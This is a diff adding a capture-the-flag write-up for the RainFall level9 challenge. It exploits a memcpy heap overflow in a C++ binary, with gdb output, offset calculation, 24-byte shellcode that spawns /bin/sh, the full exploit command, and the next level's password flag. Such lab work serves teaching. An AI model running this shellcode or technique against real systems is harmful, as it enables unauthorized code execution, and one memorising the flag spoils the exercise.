@@ -1,0 +1,69 @@
+This one is harder, its written in cpp
+
+We try to understand what is going on and find a memcpy in the setAnnotation function
+that we can exploit by overflow
+
+For this level we will need a shellcode, but first lets find the offset
+
+./level9  $(python -c 'print "A" * 109') causes a segfault so we find that 
+the offset is 108
+
+We can see that after the set annotation eax is dereferenced two times in a row and stored in edx
+
+0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
+0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
+0x08048680 <+140>:   mov    eax,DWORD PTR [eax]
+0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
+0x08048684 <+144>:   mov    eax,DWORD PTR [esp+0x14]
+0x08048688 <+148>:   mov    DWORD PTR [esp+0x4],eax
+0x0804868c <+152>:   mov    eax,DWORD PTR [esp+0x10]
+0x08048690 <+156>:   mov    DWORD PTR [esp],eax
+0x08048693 <+159>:   call   edx
+
+and then there is a call to edx
+
+When we give it a seg fault, it crashes at this line :
+
+0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
+
+(gdb) r $(python -c 'print "A" * 112')
+Starting program: /home/user/level9/level9 $(python -c 'print "A" * 112')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+(gdb) i r
+eax            0x41414141       1094795585
+ecx            0x41414141       1094795585
+
+We have eax and ecx and then a call to edx so if we manage to give edx the address
+of the shellcode then the exploit is done
+
+We look for the beginning of the buffer
+
+b* 0x0804867c
+r $(python -c 'print "A" * 112')
+(gdb) i r
+eax            0x804a00c        134520844
+
+So we have the start address
+
+Lets build the exploit like : address to shellcode + shellcode + padding + buffer
+address to shellcode address
+
+Now, by overflowing the buffer we will go the the buffer address
+which leads to the shellcode address which leads to the shellcode
+
+We will use a 24 bytes shellcode : "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+108 - 24 - 4 (length of the address of shellcode) = 80
+
+./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 80 + "\x0c\xa0\x04\x08"')
+
+level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 80 + "\x0c\xa0\x04\x08"')
+$ whoami
+bonus0
+
+$ pwd
+/home/user/level9
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
